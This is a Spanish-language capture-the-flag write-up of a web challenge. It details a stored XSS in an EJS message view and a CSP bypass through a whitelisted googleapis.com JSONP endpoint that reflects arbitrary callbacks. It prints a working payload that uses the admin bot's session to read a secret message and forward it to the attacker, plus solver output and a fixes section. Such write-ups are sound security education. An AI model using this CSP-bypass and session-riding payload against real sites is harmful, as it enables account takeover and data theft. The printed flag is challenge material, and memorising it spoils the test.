# Massagold — Cyber Apocalypse CTF 2026 (web)

> Alguien usa cartas selladas del puerto para hacer parecer que los barcos de Damas llegan
> tarde. Lyra necesita robar la primera carta falsa de la oficina del puerto.

**Categoría:** web · **Stack:** Express 4 + EJS + SQLite, bot admin con Playwright, nginx delante
**Flag:** `HTB{m3554g3_1n_7h3_cu570dy_ch41n_45a11a58e066ca28fe04ee78d719bcec}`

## TL;DR

XSS almacenado en el cuerpo del mensaje (`<%- message.content %>`), que abre un bot admin
con Playwright. La CSP no permite inline pero whitelistea `https://www.googleapis.com`:
su endpoint JSONP refleja el parámetro `callback` literalmente en una respuesta
`text/javascript` **incluso cuando lo rechaza por nombre inválido**. Como toda la CSP es
`'self'`, la exfiltración se hace por la propia aplicación: el payload lee la carta con la
flag con la sesión del admin y se la reenvía a nuestro usuario.

## La aplicación

Un correo de cuervos medieval. Registro libre, y al enviar una carta a `admin`:

```js
if (recipient.username === 'admin') {
  enqueueMessageVisit(result.lastID);
}
```

…un bot de Playwright inicia sesión como admin y abre `/messages/<id>`. La flag está en el
mensaje **id 1**, sembrado de `archivist` a `admin`.

La vista del mensaje escapa todo… menos el contenido:

```ejs
<strong>From: <%= message.sender_username %></strong>
<pre class="letter-copy"><%- message.content %></pre>
```

Así que XSS almacenado servido en bandeja. Lo interesante es lo que viene después.

## La CSP

```
default-src 'self'; script-src 'self' https://www.googleapis.com; style-src 'self';
img-src 'self' data:; connect-src 'self'; object-src 'none'; form-action 'self';
frame-ancestors 'none'
```

Sin `unsafe-inline` → nada de `<script>alert(1)</script>` ni `onerror=`. Y sin ningún
destino externo para `img-src`, `connect-src` ni `form-action` → **no se puede exfiltrar
fuera del origen**. El reto obliga a resolver dos problemas distintos.

### 1. Ejecutar código: JSONP en googleapis

`www.googleapis.com` no está en la whitelist por casualidad. Su API expone JSONP:

```bash
$ curl 'https://www.googleapis.com/customsearch/v1?callback=foo'
// API callback
foo({
  "error": { "code": 403, "message": "Method doesn't allow unregistered callers..." }
});
```

Sin API key devuelve un error, pero da igual: lo que importa es que refleja el callback.
Google sí valida el nombre… y lo refleja igualmente:

```bash
$ curl 'https://www.googleapis.com/customsearch/v1?callback=alert(1)'
// API callback
alert(1)({
  "error": { "code": 400,
    "message": "Invalid JSONP callback name: 'alert(1)'; only alphabet, number, '_', '$', '.', '[' and ']' are allowed." }
});
```

El mensaje de error dice que `(` no está permitido, y aun así ahí está `alert(1)` en un
cuerpo `text/javascript; charset=UTF-8`. Ejecución de JavaScript arbitrario dentro de la CSP.

Tres detalles prácticos que hay que respetar al construir el payload:

- **`>` se refleja escapado como `\u003e`** → una arrow function `r=>r.text()` llega al
  navegador como `r=\u003er.text()`, y un escape Unicode no vale como operador (solo en
  identificadores y cadenas): `SyntaxError`. Solución: `function(){}`.
- **`\` se refleja duplicado** → nada de escapes en la regex. `/HTB{[^}]+}/` funciona tal
  cual (en modo no-unicode, `{` sin cuantificador válido es literal).
- **`//` al final no basta.** Es el reflejo instintivo para comentar el JSON sobrante, pero
  solo mata el resto de *esa línea*; el objeto de error sigue en las siguientes y se parsea
  como código:

  ```
  fetch(...)//({
    "error": {      ← Uncaught SyntaxError: unexpected token ':'
  ```

  La forma limpia es aprovechar la propia estructura JSONP: terminar el callback en `;void`
  para que el `({...})` reflejado quede como `void({...})`, una expresión válida.

  ```js
  // API callback
  fetch(...).then(...);void({
    "error": { ... }
  });
  ```

  `node --check` sobre la respuesta real confirma la sintaxis.

### 2. Sacar la flag: exfiltración in-band

Con `connect-src 'self'` y `form-action 'self'` no hay servidor externo al que llamar. Pero
no hace falta: el bot **es** admin, y la app tiene una función de mensajería. El payload usa
la sesión del bot para enviarnos la flag a nuestra propia bandeja de entrada.

`fetch` usa `credentials: 'same-origin'` por defecto, así que la cookie de sesión (httpOnly,
inalcanzable desde JS) viaja sola.

## Exploit

```js
fetch('/messages/1')
  .then(function(r){return r.text()})
  .then(function(t){
    fetch('/messages',{
      method:'POST',
      headers:{'content-type':'application/x-www-form-urlencoded'},
      body:'to_username=lyra&content='+encodeURIComponent((t.match(/HTB{[^}]+}/)||[t])[0])
    })
  });void
```

URL-encoded dentro de:

```html
<script src="https://www.googleapis.com/customsearch/v1?callback=..."></script>
```

Se envía como cuerpo de una carta a `admin`, se espera a que el bot la abra, y la flag
aparece en nuestra bandeja. `solve.py` automatiza registro, envío y sondeo:

```
$ ./solve.py http://154.57.164.66:31371
[+] registrado como lyra_fyrjemlk
[+] carta enviada a admin, el bot la abrira en breve
[+] flag: HTB{m3554g3_1n_7h3_cu570dy_ch41n_45a11a58e066ca28fe04ee78d719bcec}
```

Nota: se manda a nuestro usuario y no a `admin`, para no re-encolar al bot en bucle.

## Reproducción local

El handout incluye el bot y el `docker-compose.yml`, así que el ciclo completo se depura sin
tocar la instancia remota:

```bash
cd challenge/
docker compose up -d --build     # expone :8081
./solve.py http://127.0.0.1:8081
```

Un detalle que cuesta tiempo si no se sabe: **el bot habla directo con `127.0.0.10:3000` y no
pasa por nginx**, así que sus peticiones no aparecen en el access log. Cuando el payload no
disparaba no había forma de distinguir "el bot no vino" de "el bot vino y el script falló".
La respuesta está en lanzar el propio Playwright del contenedor con listeners de eventos:

```bash
docker exec <container> node -e "
const {firefox}=require('/app/node_modules/playwright');
... p.on('pageerror', e => console.log('PAGEERROR', e.message)); ..."
```

Eso devolvió `PAGEERROR unexpected token: ':'` — que es exactamente el JSON de error de Google
siendo parseado como JS, y lo que llevó a cambiar `//` por `;void`.

## Arreglo

- Escapar el contenido: `<%= message.content %>`. Si hace falta formato, sanitizar con una
  allowlist (DOMPurify) en vez de volcar HTML crudo.
- Quitar `https://www.googleapis.com` de `script-src`. Cualquier dominio con un endpoint
  JSONP en la whitelist anula la CSP entera; es el motivo por el que se recomienda CSP
  basada en nonces/hashes en vez de en listas de dominios.
- Aunque la CSP hubiera sido perfecta en `script-src`, el bug de plantilla seguía ahí: la
  defensa en profundidad ayudó a subir el listón, no a cerrar el agujero.
